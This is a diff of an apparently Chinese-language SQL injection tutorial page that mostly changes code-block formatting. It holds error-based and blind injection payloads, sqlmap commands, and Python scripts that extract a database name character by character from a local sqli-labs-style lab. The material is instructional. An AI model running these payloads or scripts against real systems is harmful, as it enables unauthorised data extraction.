+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23"></a><span class="k">and</span><span class="w"> </span><span class="n">polygon</span><span class="w"> </span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24"></a><span class="w"> </span>
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">multipoint</span><span class="w"> </span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26"></a><span class="k">and</span><span class="w"> </span><span class="n">multipoint</span><span class="w"> </span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27"></a><span class="w"> </span>
+</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">multlinestring</span><span class="w"> </span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29"></a><span class="k">and</span><span class="w"> </span><span class="n">multlinestring</span><span class="w"> </span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="n">selectuser</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30"></a><span class="w"> </span>
+</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">multpolygon</span><span class="w"> </span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32"></a><span class="k">and</span><span class="w"> </span><span class="n">multpolygon</span><span class="w"> </span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="n">selectuser</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-33"><a id="__codelineno-29-33" name="__codelineno-29-33"></a><span class="w"> </span>
+</span><span id="__span-29-34"><a id="__codelineno-29-34" name="__codelineno-29-34"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">linestring</span><span class="w"> </span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-35"><a id="__codelineno-29-35" name="__codelineno-29-35"></a><span class="k">and</span><span class="w"> </span><span class="n">linestring</span><span class="w"> </span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p>报错注入：</p>
 <p><a href="https://blog.csdn.net/Myon5/article/details/135184385">最常见的SQL报错注入函数（floor、updatexml、extractvalue）及payload总结</a></p>
 <p><a href="https://cloud.tencent.com/developer/article/2168996">SQL报错注入详解</a></p>
 <p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a></p>
-<h4 id="_7">常用函数说明</h4>
+<h4 id="_7">常用函数说明<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
 <table>
 <thead>
 <tr>
@@ -3100,72 +3184,90 @@ and linestring (()select * from(select user() )a)b );
 </tr>
 </tbody>
 </table>
-<h4 id="4">4. 盲注</h4>
+<h4 id="4">4. 盲注<a class="headerlink" href="#4" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p>“盲注” = <strong>没有明显报错信息，也没有数据直接回显</strong>。但后端依旧执行了 SQL 查询，可以通过<strong>页面变化或延迟行为</strong>来判断结果真假。</p>
 </blockquote>
-<h4 id="boolean-based-blind-sqli">布尔盲注（Boolean-Based Blind SQLi）</h4>
+<h4 id="boolean-based-blind-sqli">布尔盲注（Boolean-Based Blind SQLi）<a class="headerlink" href="#boolean-based-blind-sqli" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p>构造 SQL 语句，使返回结果依据布尔表达式的真假而不同，页面内容会有细微差别（如显示文字、状态码、长度），通过这些判断结果。</p>
 </blockquote>
-<h5 id="_8">示例</h5>
+<h5 id="_8">示例<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
 <p>构造判断数据库名首字母是不是 <strong>“d”</strong>（假设是 dvwa）：</p>
-<pre><code class="language-sql">?id=1' and substr(database(),1,1)='d'-- -
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and substr(database(),1,1)=&#39;</span><span class="n">d</span><span class="err">&#39;</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>如果返回和正常页面一致：表示为真</li>
 <li>如果显示空白或不同：表示为假</li>
 <li>然后逐位猜测，得出 database() = dvwa</li>
 </ul>
 <p>payload示例：</p>
-<pre><code class="language-sql">?id=1' and length(database())=4-- -
-?id=1' and ascii(substr(database(),1,1))=100-- -   // 判断首字母是否为 d
-</code></pre>
-<h4 id="time-based-blind-sqli">时间盲注（Time-Based Blind SQLi）</h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span>
+<span class="normal"><a href="#__codelineno-31-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and length(database())=4-- -</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">100</span><span class="c1">-- -   // 判断首字母是否为 d</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="time-based-blind-sqli">时间盲注（Time-Based Blind SQLi）<a class="headerlink" href="#time-based-blind-sqli" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p>当页面回显完全一致时，无法通过“布尔变化”判断真假，我们让服务器 <strong>“休眠几秒”来作为真假判断依据</strong>。</p>
 </blockquote>
-<pre><code>IF(条件为真, SLEEP(3), 0)
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>IF(条件为真, SLEEP(3), 0)
+</span></code></pre></div></td></tr></table></div>
 <p>如果条件为真时，页面返回内容会有3秒的延时。</p>
-<pre><code class="language-sql">?id=1' and if(substr(database(),1,1)='d', sleep(3), 0)-- -
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(substr(database(),1,1)=&#39;</span><span class="n">d</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>若数据库以 d 开头，页面会延迟 3 秒返回</li>
 <li>若不为 d，立即返回</li>
 </ul>
 <p>利用这个特性，可以用脚本<strong>逐字符</strong>猜测数据库名、表名、字段名、内容等。</p>
-<pre><code class="language-sql">?id=1' and if(length(database())=4, sleep(3), 0)-- -
-?id=1' and if(ascii(substr(database(),1,1))=100, sleep(3), 0)-- -
-</code></pre>
-<h5 id="_9">自动化工具</h5>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span>
+<span class="normal"><a href="#__codelineno-34-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(length(database())=4, sleep(3), 0)-- -</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<h5 id="_9">自动化工具<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h5>
 <p>sqlmap 工具（支持盲注全自动测试）</p>
-<pre><code class="language-shell">sqlmap -u &quot;http://target.com/?id=1&quot; --technique=B --batch
-sqlmap -u &quot;http://target.com/?id=1&quot; --technique=T --batch
-</code></pre>
-<h5 id="payload_1">盲注payload顺序示例：</h5>
-<pre><code class="language-sql"># 布尔盲注
-?id=1' and 1=1-- -     -- 页面正常
-?id=1' and 1=2-- -     -- 页面变化或空白
-# 时间盲注
-?id=1' and sleep(3)-- -    -- 页面延迟返回（等待3秒）
-?id=1' and 1=1-- -         -- 页面立刻返回
-</code></pre>
-<pre><code class="language-sql"># 布尔盲注
-?id=1' and length(database())=1-- -
-?id=1' and length(database())=2-- -
-# 时间盲注
-?id=1' and if(length(database())=1, sleep(3), 0)-- -
-?id=1' and if(length(database())=2, sleep(3), 0)-- -
-</code></pre>
-<pre><code class="language-sql"># 布尔盲注
-?id=1' and ascii(substr(database(),1,1))=97-- -
-?id=1' and ascii(substr(database(),2,1))=97-- -
-# 时间盲注
-?id=1' and if(ascii(substr(database(),1,1))=97, sleep(3), 0)-- -
-?id=1' and if(ascii(substr(database(),2,1))=97, sleep(3), 0)-- -
-</code></pre>
-<h4 id="_10">盲注总结：构造关键函数</h4>
+<div class="language-shell highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span>
+<span class="normal"><a href="#__codelineno-35-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>B<span class="w"> </span>--batch
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/?id=1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>T<span class="w"> </span>--batch
+</span></code></pre></div></td></tr></table></div>
+<h5 id="payload_1">盲注payload顺序示例：<a class="headerlink" href="#payload_1" title="Permanent link">&para;</a></h5>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span>
+<span class="normal"><a href="#__codelineno-36-2">2</a></span>
+<span class="normal"><a href="#__codelineno-36-3">3</a></span>
+<span class="normal"><a href="#__codelineno-36-4">4</a></span>
+<span class="normal"><a href="#__codelineno-36-5">5</a></span>
+<span class="normal"><a href="#__codelineno-36-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a><span class="o">#</span><span class="w"> </span><span class="err">布尔盲注</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and 1=1-- -     -- 页面正常</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="c1">-- -     -- 页面变化或空白</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4"></a><span class="o">#</span><span class="w"> </span><span class="err">时间盲注</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and sleep(3)-- -    -- 页面延迟返回（等待3秒）</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -         -- 页面立刻返回</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span>
+<span class="normal"><a href="#__codelineno-37-2">2</a></span>
+<span class="normal"><a href="#__codelineno-37-3">3</a></span>
+<span class="normal"><a href="#__codelineno-37-4">4</a></span>
+<span class="normal"><a href="#__codelineno-37-5">5</a></span>
+<span class="normal"><a href="#__codelineno-37-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1"></a><span class="o">#</span><span class="w"> </span><span class="err">布尔盲注</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and length(database())=1-- -</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">2</span><span class="c1">-- -</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4"></a><span class="o">#</span><span class="w"> </span><span class="err">时间盲注</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(length(database())=1, sleep(3), 0)-- -</span>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1">1</a></span>
+<span class="normal"><a href="#__codelineno-38-2">2</a></span>
+<span class="normal"><a href="#__codelineno-38-3">3</a></span>
+<span class="normal"><a href="#__codelineno-38-4">4</a></span>
+<span class="normal"><a href="#__codelineno-38-5">5</a></span>
+<span class="normal"><a href="#__codelineno-38-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1"></a><span class="o">#</span><span class="w"> </span><span class="err">布尔盲注</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and ascii(substr(database(),1,1))=97-- -</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">97</span><span class="c1">-- -</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4"></a><span class="o">#</span><span class="w"> </span><span class="err">时间盲注</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr(database(),1,1))=97, sleep(3), 0)-- -</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6"></a><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">97</span><span class="p">,</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="_10">盲注总结：构造关键函数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
 <table>
 <thead>
 <tr>
@@ -3196,169 +3298,319 @@ sqlmap -u &quot;http://target.com/?id=1&quot; --technique=T --batch
 </tr>
 </tbody>
 </table>
-<h4 id="gpt">脚本（通过GPT添加注释与优化）：</h4>
-<pre><code class="language-sql"># 布尔盲注
-import requests
-
-# ========================
-# 配置区
-# ========================
-URL = &quot;http://127.0.0.1:9999/Less-1/index.php&quot;
-CHARSET = &quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;
-MAX_LEN = 20
-TRUE_MARK = &quot;You are in&quot;  # 判断页面是否正常的关键标识
-# ========================
-
-# 判断 payload 是否为真
-def is_true(payload):
-    full_url = f&quot;{URL}?id=1' AND {payload}--+&quot;
-    res = requests.get(full_url)
-    return TRUE_MARK in res.text
-
-# 猜测数据库名长度
-def get_database_length():
-    for i in range(1, MAX_LEN + 1):
-        payload = f&quot;LENGTH(DATABASE())={i}&quot;
-        if is_true(payload):
-            print(f&quot;[+] Database name length: {i}&quot;)
-            return i
-    print(&quot;[-] Failed to determine database length&quot;)
-    return 0
-
-# 猜测数据库名内容
-def get_database_name(length):
-    name = ''
-    for pos in range(1, length + 1):
-        for ch in CHARSET:
-            payload = f&quot;SUBSTR(DATABASE(),{pos},1)='{ch}'&quot;
-            if is_true(payload):
-                name += ch
-                print(f&quot;[+] Found char {pos}: {ch} -&gt; {name}&quot;)
-                break
-    print(f&quot;[✓] Database name: {name}&quot;)
-    return name
-
-# 主函数
-if __name__ == '__main__':
-    print(&quot;🔍 Boolean-based blind SQLi demo&quot;)
-    db_len = get_database_length()
-    if db_len &gt; 0:
-        get_database_name(db_len)
-</code></pre>
-<pre><code class="language-python"># 时间盲注
-import requests
-import time
-
-# ========================
-# 配置区
-# ========================
-URL = &quot;http://127.0.0.1:9999/Less-1/index.php&quot;
-DELAY_THRESHOLD = 2         # 响应延迟阈值（秒）
-SLEEP_TIME = 3              # sleep 延迟时间（秒）
-CHARSET = &quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;
-MAX_DB_LENGTH = 20          # 最大尝试数据库长度
-# ========================
-
-# 统一的时间测量函数
-def is_delay(payload):
-    full_url = f&quot;{URL}?id=1' AND {payload}--+&quot;
-    start = time.time()
-    requests.get(full_url)
-    end = time.time()
-    return (end - start) &gt;= DELAY_THRESHOLD
-
-# 猜测数据库名长度
-def get_database_length():
-    for length in range(1, MAX_DB_LENGTH + 1):
-        payload = f&quot;IF(LENGTH(DATABASE())={length}, SLEEP({SLEEP_TIME}), 0)&quot;
-        if is_delay(payload):
-            print(f&quot;[+] Database name length: {length}&quot;)
-            return length
-    print(&quot;[-] Failed to determine length&quot;)
-    return 0
-
-# 爆破数据库名
-def get_database_name(length):
-    name = ''
-    for pos in range(1, length + 1):
-        for ch in CHARSET:
-            payload = f&quot;IF(SUBSTR(DATABASE(), {pos}, 1)='{ch}', SLEEP({SLEEP_TIME}), 0)&quot;
-            if is_delay(payload):
-                name += ch
-                print(f&quot;[+] Found char {pos}: {ch} -&gt; {name}&quot;)
-                break
-    print(f&quot;[✓] Database name: {name}&quot;)
-    return name
-
-# 主函数
-if __name__ == '__main__':
-    print(&quot;🔍 Getting database name length...&quot;)
-    db_len = get_database_length()
-    if db_len &gt; 0:
-        print(&quot;🔍 Getting database name content...&quot;)
-        get_database_name(db_len)
-</code></pre>
+<h4 id="gpt">脚本（通过GPT添加注释与优化）：<a class="headerlink" href="#gpt" title="Permanent link">&para;</a></h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-39-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-39-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-39-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-39-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-39-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-39-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-39-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-39-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-39-10">10</a></span>
+<span class="normal"><a href="#__codelineno-39-11">11</a></span>
+<span class="normal"><a href="#__codelineno-39-12">12</a></span>
+<span class="normal"><a href="#__codelineno-39-13">13</a></span>
+<span class="normal"><a href="#__codelineno-39-14">14</a></span>
+<span class="normal"><a href="#__codelineno-39-15">15</a></span>
+<span class="normal"><a href="#__codelineno-39-16">16</a></span>
+<span class="normal"><a href="#__codelineno-39-17">17</a></span>
+<span class="normal"><a href="#__codelineno-39-18">18</a></span>
+<span class="normal"><a href="#__codelineno-39-19">19</a></span>
+<span class="normal"><a href="#__codelineno-39-20">20</a></span>
+<span class="normal"><a href="#__codelineno-39-21">21</a></span>
+<span class="normal"><a href="#__codelineno-39-22">22</a></span>
+<span class="normal"><a href="#__codelineno-39-23">23</a></span>
+<span class="normal"><a href="#__codelineno-39-24">24</a></span>
+<span class="normal"><a href="#__codelineno-39-25">25</a></span>
+<span class="normal"><a href="#__codelineno-39-26">26</a></span>
+<span class="normal"><a href="#__codelineno-39-27">27</a></span>
+<span class="normal"><a href="#__codelineno-39-28">28</a></span>
+<span class="normal"><a href="#__codelineno-39-29">29</a></span>
+<span class="normal"><a href="#__codelineno-39-30">30</a></span>
+<span class="normal"><a href="#__codelineno-39-31">31</a></span>
+<span class="normal"><a href="#__codelineno-39-32">32</a></span>
+<span class="normal"><a href="#__codelineno-39-33">33</a></span>
+<span class="normal"><a href="#__codelineno-39-34">34</a></span>
+<span class="normal"><a href="#__codelineno-39-35">35</a></span>
+<span class="normal"><a href="#__codelineno-39-36">36</a></span>
+<span class="normal"><a href="#__codelineno-39-37">37</a></span>
+<span class="normal"><a href="#__codelineno-39-38">38</a></span>
+<span class="normal"><a href="#__codelineno-39-39">39</a></span>
+<span class="normal"><a href="#__codelineno-39-40">40</a></span>
+<span class="normal"><a href="#__codelineno-39-41">41</a></span>
+<span class="normal"><a href="#__codelineno-39-42">42</a></span>
+<span class="normal"><a href="#__codelineno-39-43">43</a></span>
+<span class="normal"><a href="#__codelineno-39-44">44</a></span>
+<span class="normal"><a href="#__codelineno-39-45">45</a></span>
+<span class="normal"><a href="#__codelineno-39-46">46</a></span>
+<span class="normal"><a href="#__codelineno-39-47">47</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1"></a><span class="o">#</span><span class="w"> </span><span class="err">布尔盲注</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2"></a><span class="n">import</span><span class="w"> </span><span class="n">requests</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3"></a>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4"></a><span class="o">#</span><span class="w"> </span><span class="o">========================</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5"></a><span class="o">#</span><span class="w"> </span><span class="err">配置区</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6"></a><span class="o">#</span><span class="w"> </span><span class="o">========================</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7"></a><span class="n">URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;http://127.0.0.1:9999/Less-1/index.php&quot;</span>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8"></a><span class="n">CHARSET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9"></a><span class="n">MAX_LEN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20</span>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10"></a><span class="n">TRUE_MARK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;You are in&quot;</span><span class="w">  </span><span class="o">#</span><span class="w"> </span><span class="err">判断页面是否正常的关键标识</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11"></a><span class="o">#</span><span class="w"> </span><span class="o">========================</span>
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12"></a>
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13"></a><span class="o">#</span><span class="w"> </span><span class="err">判断</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="err">是否为真</span>
+</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14"></a><span class="n">def</span><span class="w"> </span><span class="n">is_true</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15"></a><span class="w">    </span><span class="n">full_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="ss">&quot;{URL}?id=1&#39; AND {payload}--+&quot;</span>
+</span><span id="__span-39-16"><a id="__codelineno-39-16" name="__codelineno-39-16"></a><span class="w">    </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="n">full_url</span><span class="p">)</span>
